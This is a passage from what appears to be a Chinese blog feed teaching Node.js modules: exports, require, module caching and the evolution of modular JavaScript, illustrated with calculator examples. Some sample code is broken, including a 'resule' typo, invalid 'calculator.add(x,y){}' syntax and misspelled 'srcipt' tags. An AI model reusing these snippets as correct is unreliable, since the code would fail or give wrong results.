punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'age:'</span><span class="token operator">+</span>myModule<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用模块的方法</span>myModule<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="4-2-exports和module-exports的区别"><a href="#4-2-exports和module-exports的区别" class="headerlink" title="4.2 exports和module.exports的区别"></a>4.2 exports和module.exports的区别</h3><p>exports是一个指向module.exports的引用，module.exports初始值为一个空对象{}，所以exports初始值也是{}，虽然exports和module.exports都可以向模块外开放变量和函数，但是使用上，<strong>module.exports可以单独定义，返回数据类型，而exports只能返回一个object对象</strong>。</p><p>例如：</p><p>test.js</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//定义一个数组</span>module<span class="token punctuation">.</span>exports<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'type'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>demo2-5.js</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//加载模块</span><span class="token keyword">let</span> myModule <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>myModule<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出数组长度</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length:'</span><span class="token operator">+</span>myModule<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//输出 结果</span><span class="token comment" spellcheck="true">//[ 'name', 'type', 'age' ]</span><span class="token comment" spellcheck="true">//length:3</span></code></pre><p>修改test.js中的代码</p><pre class=" language-js"><code class="language-js">exports<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'type'</span><span class="token punctuation">,</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//最后输出</span><span class="token comment" spellcheck="true">//{}</span><span class="token comment" spellcheck="true">//length:undefined</span></code></pre><p>可见使用exports直接定义数据，会切断exports与module.exports的联系，出现了找不到值的情况。</p><h2 id="5-全局可用变量，函数和对象"><a href="#5-全局可用变量，函数和对象" class="headerlink" title="5.全局可用变量，函数和对象"></a>5.全局可用变量，函数和对象</h2><p>即不需要进行模块加载，可以直接使用的，例如require()函数。</p><h3 id="5-1-dirname和-filename变量"><a href="#5-1-dirname和-filename变量" class="headerlink" title="5.1 _dirname和 _filename变量"></a>5.1 _dirname和 _filename变量</h3><ul><li>_dirname表示当前文件所在的目录</li><li>_filename表示当前正在执行的脚本的文件名。（绝对路径）</li></ul><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'文件的目录是：'</span><span class="token operator">+</span>__dirname<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'文件的绝对路径是：'</span><span class="token operator">+</span>__filename<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出</span><span class="token comment" spellcheck="true">//文件的目录是：C:\Users\Jin\Desktop\前端学习\Node.js\chapter 02</span><span class="token comment" spellcheck="true">//文件的绝对路径是：C:\Users\Jin\Desktop\前端学习\Node.js\chapter 02\demo2-6.js</span></code></pre><h3 id="5-2-全局函数"><a href="#5-2-全局函数" class="headerlink" title="5.2 全局函数"></a>5.2 全局函数</h3><ul><li>setTimeout(cb,ms)：ms后执行cb</li><li>clearTimeout()</li><li>setInterval(cb,ms)：每ms后执行cb</li><li>clearInterval()</li><li>setImmediate(cb)：延迟调用cb函数，cb将在I/O事件回调之后，setTimeout和setInterval回调之前调用</li><li>clearImmediate()</li></ul><h3 id="5-3-console对象"><a href="#5-3-console对象" class="headerlink" title="5.3 console对象"></a>5.3 console对象</h3><p>console是一个全局对象，除了console.log()函数外还提供了其他函数</p><ul><li>console.info</li><li>console.error</li><li>console.warn</li><li>console.dir：用来对一个对象进行检查，以易于阅读和打印的格式显示</li><li>console.time和console.timeEnd</li><li>console.trace：当前执行代码在堆栈中的调用路径</li><li>console.assert：判断某个表达式或变量是否为真（断言）</li></ul><h2 id="6-重写计算器模块"><a href="#6-重写计算器模块" class="headerlink" title="6 重写计算器模块"></a>6 重写计算器模块</h2><p>以add.js为例，定义加减乘除模块</p><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>index.js：分别使用require加载4个功能模块，并使用exports向外开放这4个接口</p><pre class=" language-js"><code class="language-js">module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>    add<span class="token punctuation">:</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./add'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//sub</span>    <span class="token comment" spellcheck="true">//mul</span>    <span class="token comment" spellcheck="true">//divide</span><span class="token punctuation">}</span></code></pre><p>testCal.js</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> cal <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cal<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//3</span></code></pre><h2 id="7-require-的模块加载规则"><a href="#7-require-的模块加载规则" class="headerlink" title="7. require()的模块加载规则"></a>7. require()的模块加载规则</h2><p>主要分为两类：文件模块和核心模块</p><ol><li>文件模块</li></ol><pre class=" language-js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'路径.扩展名'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'/example.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//当前目录</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./example.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../example.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//上一目录</span></code></pre><ol start="2"><li>核心模块</li></ol><p>核心模块包含了基本的API，保存在node.js源码的lib文件下，例如</p><ul><li>全局对象</li><li>常用工具</li><li>事件机制</li><li>文件系统访问</li><li>HTTP服务器与客户端</li></ul><pre class=" language-js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'模块标识'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> os <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span><span class="token function">cpus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="8-模块的缓存"><a href="#8-模块的缓存" class="headerlink" title="8. 模块的缓存"></a>8. 模块的缓存</h2><p>多次使用同一模块，Node.js只会加载一次，模块被缓存在require.cache中</p><p>foo.js:</p><pre class=" language-js"><code class="language-js">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'foo模块被加载了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>test.js:</p><pre class=" language-js"><code class="language-js"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./foo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//只输出一次 foo模块被加载了，说明只加载了一次</span></code></pre><p>在foo.js加入</p><pre class=" language-js"><code class="language-js"><span class="token keyword">delete</span> require<span class="token punctuation">.</span>cache<span class="token punctuation">[</span>module<span class="token punctuation">.</span>filename<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除缓存后输出4次</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>模块化编程</title>
      <link href="2019/05/01/Node.js-%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/"/>
      <url>2019/05/01/Node.js-%E6%A8%A1%E5%9D%97%E5%8C%96%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>随着 Web 技术的蓬勃发展和依赖的基础设施日益完善，前端领域逐渐从浏览器扩展至服务端（Node.js），桌面端（PC、Android、iOS），乃至于物联网设备（IoT），其中 JavaScript 承载着这些应用程序的核心部分，随着其规模化和复杂度的成倍增长，其软件工程体系也随之建立起来（协同开发、单元测试、需求和缺陷管理等），模块化编程的需求日益迫切。</p><p>JavaScript 对模块化编程的支持尚未形成规范，难以堪此重任；一时间，江湖侠士挺身而出，一路披荆斩棘，从刀耕火种过渡到面向未来的模块化方案；</p><h1 id="初识模块化思想"><a href="#初识模块化思想" class="headerlink" title="初识模块化思想"></a>初识模块化思想</h1><h2 id="模块化的概念"><a href="#模块化的概念" class="headerlink" title="模块化的概念"></a>模块化的概念</h2><p>模块化是一种生产方式，这种方式体现了两个特点</p><p>（1）生产效率高</p><p>（2）维护成本低</p><h2 id="模块化开发"><a href="#模块化开发" class="headerlink" title="模块化开发"></a>模块化开发</h2><p>非模块化开发会遇到哪些问题</p><ol><li>命名冲突</li></ol><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//全局变量中名称重复</span><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token string">'bar'</span><span class="token punctuation">;</span><span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token string">'brz'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//另外若引用第三方的库，在全局对象中声明了一个属性foo，自己的代码中有同样的名称，后加载的会替换之前的</span></code></pre><ol start="2"><li>文件依赖</li></ol><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>srcipt</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>./ccc.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>srcipt</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>srcipt</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>./a.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>srcipt</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>srcipt</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>./b.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>srcipt</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>srcipt</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>./c.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>srcipt</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>srcipt</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>./d.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>srcipt</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>srcipt</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>./aaa.js<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>srcipt</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--->.aaa,js依赖于./a.js,若调换顺序则会出错，模块化开发并不需要将所有的文件引入&lt;!---></span></code></pre><h1 id="模块化编程的演变"><a href="#模块化编程的演变" class="headerlink" title="模块化编程的演变"></a>模块化编程的演变</h1><h2 id="全局函数"><a href="#全局函数" class="headerlink" title="全局函数"></a>全局函数</h2><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--->计算器的例子&lt;!---></span><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>模块化开发演变-全局函数<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>x<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>opt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>y<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>cal<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>result<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token comment" spellcheck="true">//定义计算函数</span>        <span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">subtract</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">divide</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//获取Dom</span>        <span class="token keyword">var</span> oX <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oY <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oOpt <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'opt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oCal <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'cal'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oResult <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//为等号按钮添加单击事件</span>        oCal<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> x <span class="token operator">=</span> oX<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> y <span class="token operator">=</span> oY<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> opt <span class="token operator">=</span> oOpt<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">'0'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token function">subtract</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> <span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                    resule <span class="token operator">=</span> <span class="token function">divide</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            oResult<span class="token punctuation">.</span>value <span class="token operator">=</span> result<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>全局函数这种编程方式很常见，但是不可取，无法保证全局变量不与其他模块的变量冲突。</p><h2 id="对象命名空间"><a href="#对象命名空间" class="headerlink" title="对象命名空间"></a>对象命名空间</h2><pre class=" language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token comment" spellcheck="true">//对象命名空间</span>        <span class="token keyword">var</span> calculator <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//定义计算函数</span>        calculator<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        calculator<span class="token punctuation">.</span><span class="token function">subtract</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        calculator<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        calculator<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">parseInt</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//获取Dom</span>        <span class="token keyword">var</span> oX <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oY <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oOpt <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'opt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oCal <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'cal'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> oResult <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'result'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//为等号按钮添加单击事件</span>        oCal<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">var</span> x <span class="token operator">=</span> oX<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> y <span class="token operator">=</span> oY<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> opt <span class="token operator">=</span> oOpt<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>opt<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">'0'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">subtract</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                    result <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">multiply</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                    resule <span class="token operator">=</span> calculator<span class="token punctuation">.</span><span class="token function">divide</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>    